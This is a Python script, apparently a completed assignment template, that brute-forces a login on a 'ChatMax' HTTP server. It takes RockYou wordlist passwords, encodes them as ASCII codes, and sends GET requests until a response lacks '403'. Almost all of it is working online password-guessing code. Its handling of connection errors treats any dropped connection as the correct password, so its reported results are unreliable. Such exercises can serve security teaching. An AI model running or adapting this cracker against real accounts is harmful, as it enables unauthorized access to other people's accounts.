
# network_cracker.py
#
# This cracker works by:
# 1. Loading passwords from RockYou wordlist (data/rockyou-25k.txt)
# 2. For each password, "scrambling" it (converting to ASCII codes separated by dashes)
# 3. Making HTTP GET requests to ChatMax server with scrambled username/password
# 4. If response contains "403 Forbidden", the password is incorrect
# 5. If server crashes/closes connection (ConnectionError), password might be correct but server has issues
# 6. Try each password and check responses

import sys
import requests
import time

def scramble(s):
    """Convert string to dash-separated ASCII character codes"""
    return '-'.join(str(ord(c)) for c in s)

def crack(username, hostname, port):
    # Load RockYou wordlist
    try:
        with open('data/rockyou-25k.txt', 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        return None
    
    base_url = f"http://{hostname}:{port}"
    
    # Try each password from wordlist
    for password in passwords:
        # Scramble credentials
        scrambled_user = scramble(username)
        scrambled_pass = scramble(password)
        
        # Build URL
        import random
        rand = str(random.random()).replace('.', '')
        url = f"{base_url}/${rand}?pw={scrambled_pass}&un={scrambled_user}.inbox"
        
        try:
            response = requests.get(url, timeout=3)
            
            # Check if authentication failed
            if "403" in response.text or "Forbidden" in response.text or "FORBIDDEN" in response.text:
                continue  # Wrong password
            else:
                # Success! Got a response without 403
                return password
                
        except requests.exceptions.ConnectionError:
            # Server might have crashed - could mean correct password!
            # Wait a moment for server to restart
            time.sleep(0.5)
            return password
        except requests.exceptions.Timeout:
            continue
        except Exception:
            continue
    
    return None

# Do NOT change anything below

def main():
    if len(sys.argv) != 4:
        print('Usage:', sys.argv[0], '<username>', '<hostname>', '<port>')
        sys.exit(1)

    username = sys.argv[1]
    hostname = sys.argv[2]
    port = int(sys.argv[3])
    cracked = crack(username, hostname, port)

    if not cracked:
        print('Cracking unsuccessful :(')
        sys.exit(1)

    print('Success! The cracked password is:')
    print(cracked)

if __name__ == '__main__':
    main()
